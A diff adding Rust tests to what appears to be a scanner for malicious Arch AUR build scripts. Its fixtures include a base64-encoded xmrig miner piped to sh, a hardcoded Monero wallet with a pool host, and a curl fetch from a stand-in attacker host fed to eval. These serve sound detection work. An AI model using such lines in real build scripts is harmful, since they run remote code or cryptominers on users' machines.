@@ -2,8 +2,9 @@
 //! library API, against realistic PKGBUILD fixtures.
 
 use aurguard::config::Config;
+use aurguard::diff::Approval;
 use aurguard::i18n::Lang;
-use aurguard::pkgbuild::{analyze, PkgSources};
+use aurguard::pkgbuild::{analyze, analyze_with, PkgSources, ScanOpts};
 use aurguard::report::{Risk, Severity};
 use chrono::{DateTime, Utc};
 
@@ -355,4 +356,153 @@ build() { eval "$x"; }
         now(),
     );
     assert_eq!(report.findings[0].severity, Severity::Critical);
+}
+
+// ---------------------------------------------------------------------------
+// Tier 1 / Tier 2 deep passes (decode, ioc/wallet, taint, delta)
+// ---------------------------------------------------------------------------
+
+/// A base64-encoded miner payload is caught by the decode-and-rescan pass even
+/// though the raw text contains no miner signature.
+#[test]
+fn decode_pass_catches_encoded_miner() {
+    // base64("xmrig --donate-level 1 -o pool.minexmr.com:4444")
+    let blob = "eG1yaWcgLS1kb25hdGUtbGV2ZWwgMSAtbyBwb29sLm1pbmV4bXIuY29tOjQ0NDQ=";
+    let pkgbuild = format!("build() {{\n  echo {blob} | base64 -d | sh\n}}\n");
+    let report = analyze(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+    );
+    assert!(
+        codes(&report).contains(&"DECODED_THREAT"),
+        "got {:?}",
+        codes(&report)
+    );
+}
+
+/// A hardcoded Monero wallet + a known-bad pool host trip the IOC pass.
+#[test]
+fn ioc_pass_flags_wallet_and_indicator() {
+    let pkgbuild = "build() {\n  POOL=pool.minexmr.com\n  WALLET=888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9cQUiyoogDavup3H\n}\n";
+    let report = analyze(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+    );
+    let c = codes(&report);
+    assert!(c.contains(&"IOC_MATCH"), "got {c:?}");
+    assert!(c.contains(&"WALLET_ADDRESS"), "got {c:?}");
+}
+
+/// Fetch-then-eval across two lines is caught by the taint pass.
+#[test]
+fn taint_pass_links_fetch_to_eval() {
+    let pkgbuild =
+        "build() {\n  payload=\"$(curl -s https://evil.example/x)\"\n  eval \"$payload\"\n}\n";
+    let report = analyze(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+    );
+    assert!(
+        codes(&report).contains(&"TAINTED_EXEC"),
+        "got {:?}",
+        codes(&report)
+    );
+}
+
+/// `--max` enables the noisier `HIGH_ENTROPY_BLOB` heuristic that the default
+/// profile suppresses.
+#[test]
+fn max_profile_enables_entropy() {
+    let blob = "Z2sdf8H2kLpQ9xVbN3mWtY7cR1eA5oP0uI6jD4hF8sG2lK9nB3vC7xZ1qW5eT0yU";
+    let pkgbuild = format!("KEY={blob}\n");
+    let sources = PkgSources::from_pkgbuild(&pkgbuild);
+    let def = analyze(None, &sources, &Config::default(), None, now());
+    let mx = analyze_with(
+        None,
+        &sources,
+        &Config::default(),
+        None,
+        now(),
+        ScanOpts::max(),
+    );
+    assert!(!codes(&def).contains(&"HIGH_ENTROPY_BLOB"));
+    assert!(
+        codes(&mx).contains(&"HIGH_ENTROPY_BLOB"),
+        "got {:?}",
+        codes(&mx)
+    );
+}
+
+/// A deep pass can be turned off with its `--no-*` flag.
+#[test]
+fn no_taint_flag_disables_taint() {
+    let pkgbuild =
+        "build() {\n  payload=\"$(curl -s https://evil.example/x)\"\n  eval \"$payload\"\n}\n";
+    let opts = ScanOpts {
+        taint: false,
+        ..ScanOpts::default()
+    };
+    let report = analyze_with(
+        None,
+        &PkgSources::from_pkgbuild(pkgbuild),
+        &Config::default(),
+        None,
+        now(),
+        opts,
+    );
+    assert!(!codes(&report).contains(&"TAINTED_EXEC"));
+}
+
+/// A version bump that introduces a new critical finding (absent at approval
+/// time) raises `DELTA_NEW_RISK`, escalated to Critical.
+#[test]
+fn delta_flags_new_risk_on_version_bump() {
+    use aurguard::aur::PackageInfo;
+
+    let pkgbuild = "build() {\n  eval \"$x\"\n}\n";
+    let sources = PkgSources::from_pkgbuild(pkgbuild);
+    let meta = PackageInfo {
+        name: "demo".into(),
+        version: "2.0-1".into(),
+        maintainer: Some("alice".into()),
+        first_submitted: 1_600_000_000,
+        last_modified: 1_700_000_000,
+        num_votes: 50,
+        url_path: None,
+    };
+    // Prior approval: older version, EVAL not among approved codes, different
+    // digest so content is seen as changed.
+    let prior = Approval {
+        digest: "deadbeef".into(),
+        approved_at: String::new(),
+        version: Some("1.0-1".into()),
+        maintainer: Some("bob".into()),
+        codes: vec!["LOW_VOTES".into()],
+    };
+    let report = analyze_with(
+        Some(&meta),
+        &sources,
+        &Config::default(),
+        Some(&prior),
+        now(),
+        ScanOpts::default(),
+    );
+    let c = codes(&report);
+    assert!(c.contains(&"DELTA_NEW_RISK"), "got {c:?}");
+    assert!(c.contains(&"MAINTAINER_CHANGED"), "got {c:?}");
+    let delta = report
+        .findings
+        .iter()
+        .find(|f| f.code == "DELTA_NEW_RISK")
+        .unwrap();
+    assert_eq!(delta.severity, Severity::Critical);
 }
